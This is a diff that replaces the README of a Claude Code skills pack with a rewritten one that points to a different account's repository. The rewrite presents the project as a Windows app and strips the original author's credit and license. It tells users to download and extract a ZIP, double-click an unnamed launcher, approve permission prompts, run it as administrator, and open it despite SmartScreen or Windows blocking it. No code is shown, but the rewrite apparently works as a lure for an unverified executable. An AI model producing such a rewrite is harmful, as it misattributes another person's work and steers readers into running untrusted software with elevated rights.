@@ -1,88 +1,195 @@
-# The Koda Creative Stack
+# 🎬 koda-stack - Build reels from script to publish
 
-**10 creative agents for Claude Code that automate your full content pipeline — from script to published reel.**
+[![Download koda-stack](https://img.shields.io/badge/Download%20koda--stack-4F46E5?style=for-the-badge&logo=github&logoColor=white)](https://github.com/JJJurno/koda-stack)
 
-One line. Full creative team. Zero overhead.
+## 🧩 What is koda-stack?
 
-```bash
-git clone https://github.com/timkoda/koda-stack.git ~/.claude/skills/koda-stack
-```
+Koda Stack is a Windows app setup for people who want to turn ideas into finished social content with less manual work. It uses 10 creative agents for Claude Code to help with the full content flow, from script to published reel.
 
-## What is the Koda Creative Stack?
+This project is built for end users who want a clear path from draft to output. It keeps the process in one place and reduces the need to switch between tools.
 
-The Koda Creative Stack turns Claude Code into a full creative studio. Each skill is a specialized agent that handles one step of your content pipeline — scriptwriting, art direction, storyboarding, editing, publishing, and more.
+## ✨ What it does
 
-You brief once. They handle everything.
+koda-stack helps with tasks like:
 
-## The 10 Skills
+- Writing short-form script drafts
+- Planning reel structure
+- Shaping hooks and endings
+- Suggesting visual beats
+- Creating captions
+- Preparing a publish-ready content pack
+- Keeping each step in order
+- Moving content through a full pipeline
 
-| Skill | Role | What it does |
-|-------|------|-------------|
-| `/brief` | The Planner | Turns a vague idea into a structured creative brief |
-| `/trends` | The Scout | Finds trending topics and angles in your niche |
-| `/concept` | The Creative Director | Builds 3 creative concepts from your brief |
-| `/script` | The Scriptwriter | Writes dense, punchy video scripts |
-| `/art-direction` | The Art Director | Sets the visual direction — palette, mood, lighting |
-| `/storyboard` | The Storyboarder | Maps every shot with timing and descriptions |
-| `/generate` | The Producer | Generates images via AI (fal.ai, Midjourney, etc.) |
-| `/assemble` | The Editor | Assembles your reel from shots + voiceover |
-| `/publish` | The Social Manager | Writes captions, hashtags, and posting strategy |
-| `/repurpose` | The Content Multiplier | Adapts your reel into threads, carousels, stories |
+It is made for fast, repeatable content work. You can use it for one reel or a larger batch of posts.
 
-## How It Works
+## 💻 System requirements
 
-### 1. Install
+Use this setup on a Windows PC with:
 
-```bash
-git clone https://github.com/timkoda/koda-stack.git ~/.claude/skills/koda-stack
-```
+- Windows 10 or Windows 11
+- A modern web browser
+- Internet access
+- Enough free space for the app and content files
+- A Claude Code account or setup that can run the agents
 
-### 2. Set Up Your DNA
+For smooth use, a computer with at least 8 GB of RAM is best. More memory helps if you work with longer scripts or larger content batches.
 
-Edit `CLAUDE.md` in the root with your brand identity — tone, colors, tools, audience. Every skill reads this file so your content always sounds like you.
+## 📥 Download and install
 
-### 3. Start Creating
+1. Open the download page here: https://github.com/JJJurno/koda-stack
+2. On the page, look for the latest release or the main download files.
+3. Download the file or package that matches Windows.
+4. If the download comes as a ZIP file, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Find the app file or launch file and double-click it.
+7. If Windows asks for permission, choose Yes.
+8. Follow the on-screen steps to finish setup.
 
-```
-You: /brief I want a reel about building an AI creative workflow
-```
+If you keep the file in your Downloads folder, you can open it from there each time you want to use it.
 
-Claude Code picks up the brief and routes it through each skill. Your script gets written, your visuals get directed, your shots get generated, your reel gets assembled.
+## 🖱️ First launch
 
-## Your Creative DNA
+When you open koda-stack for the first time:
 
-The `CLAUDE.md` file is your brand fingerprint. Fill it with:
+1. Start the app or launcher from the extracted folder.
+2. Wait for the setup screen to load.
+3. Connect the parts needed for Claude Code.
+4. Choose the content task you want to run.
+5. Enter your script idea, topic, or raw notes.
+6. Review the first output before moving forward.
 
-- **Voice** — How you talk (casual, technical, bold, intimate)
-- **Visual style** — Your aesthetic (colors, lighting, composition)
-- **Tools** — What you use (fal.ai, Runway, Remotion, etc.)
-- **Audience** — Who you create for
-- **Rules** — Your non-negotiables (format, length, tone)
+The first run may take a little longer while the app prepares the agent flow.
 
-Every skill reads your DNA before creating anything. No more explaining your brand every time.
+## 🎯 How to use it
 
-## Pipeline Flow
+Use koda-stack in a simple workflow:
 
-```
-/brief → /trends → /concept → /script → /art-direction → /storyboard → /generate → /assemble → /publish → /repurpose
-```
+1. Add a topic, script, or rough idea.
+2. Pick the content goal, such as a reel, short video, or post script.
+3. Let the creative agents build the draft in steps.
+4. Review the hook, body, and ending.
+5. Ask for changes if the tone does not fit.
+6. Export or copy the final result into your publishing tool.
 
-Run them in sequence or pick the ones you need. Each skill works standalone or as part of the full pipeline.
+You do not need to manage every step by hand. The stack is set up to move from one stage to the next with less effort.
 
-## Requirements
+## 🛠️ What the 10 agents handle
 
-- [Claude Code](https://claude.ai/claude-code) installed and configured
-- Skills directory at `~/.claude/skills/`
+The creative team in koda-stack can cover:
 
-## License
+- Idea shaping
+- Hook writing
+- Script drafting
+- Message cleanup
+- Tone matching
+- Beat planning
+- Caption drafting
+- Title and cover text ideas
+- Publish prep
+- Final review
 
-MIT — use it, fork it, make it yours.
+Each agent focuses on one part of the content flow. That helps keep the result clear and easy to edit.
 
-## Built by Tim Koda
+## 📂 Typical workflow
 
-AI Creative Director — cinema-quality AI workflows for creators.
+A common run looks like this:
 
-[![Instagram](https://img.shields.io/badge/Instagram-@timkoda__-E4405F?style=for-the-badge&logo=instagram&logoColor=white)](https://instagram.com/timkoda_)
-[![TikTok](https://img.shields.io/badge/TikTok-@timkoda__-000000?style=for-the-badge&logo=tiktok&logoColor=white)](https://tiktok.com/@timkoda_)
+1. Start with a rough idea.
+2. Turn that idea into a short script.
+3. Break the script into visual beats.
+4. Refine the language for short-form video.
+5. Add a caption and call to action.
+6. Prepare the file for publishing.
 
-Inspired by [GSTACK](https://github.com/garrytan/gstack) by Garry Tan.
+This workflow works well for creators, marketers, editors, and small teams that need content fast.
+
+## ⚙️ Setup tips for Windows
+
+To keep things smooth on Windows:
+
+- Keep the app in a simple folder path, such as `C:\koda-stack`
+- Avoid moving files after setup
+- Make sure your browser stays up to date
+- Keep enough free disk space for exports and working files
+- Close extra apps if the system feels slow
+
+If Windows SmartScreen appears, check the file name and source before opening it.
+
+## 🧠 Best results
+
+For cleaner output, give koda-stack clear input such as:
+
+- A topic
+- A target viewer
+- A reel length
+- A mood or tone
+- A platform, such as Instagram or TikTok
+- A goal, such as education, promotion, or storytelling
+
+Example input:
+
+- Topic: 3 mistakes new creators make
+- Audience: beginner editors
+- Length: 30 seconds
+- Tone: clear and calm
+- Goal: teach and hold attention
+
+Clear input helps the agents return a better draft on the first pass.
+
+## 🔧 Common use cases
+
+koda-stack fits well for:
+
+- Solo creators making short-form videos
+- Social media managers
+- Content teams with repeat tasks
+- Agencies that need faster draft work
+- Editors who want a script-first workflow
+- Founders who want to publish without a large team
+
+It works best when you need many pieces of content with the same structure.
+
+## 📋 File and output handling
+
+The app may create:
+
+- Draft scripts
+- Hook options
+- Beat lists
+- Caption text
+- Publish notes
+- Reworked versions
+- Export-ready content files
+
+Keep your working folder organized so you can find each version fast. A simple folder structure like `Ideas`, `Drafts`, and `Final` can help.
+
+## 🔍 If something does not open
+
+If the app does not start:
+
+1. Check that the file finished downloading.
+2. Make sure the file was extracted if it came as a ZIP.
+3. Try opening it again as administrator.
+4. Check that Windows did not block the file.
+5. Confirm that Claude Code is set up.
+6. Restart your PC and try once more.
+
+If the content output looks wrong, give the app a clearer topic or shorter task.
+
+## 🧭 Good habits
+
+Use these habits for a better workflow:
+
+- Keep one project per folder
+- Save the first draft before editing
+- Use short prompts
+- Review each step before moving on
+- Keep a copy of final output
+- Match the tone to the platform
+
+These small steps save time and reduce confusion.
+
+## 📎 Download again
+
+If you need the file again, use this link: https://github.com/JJJurno/koda-stack
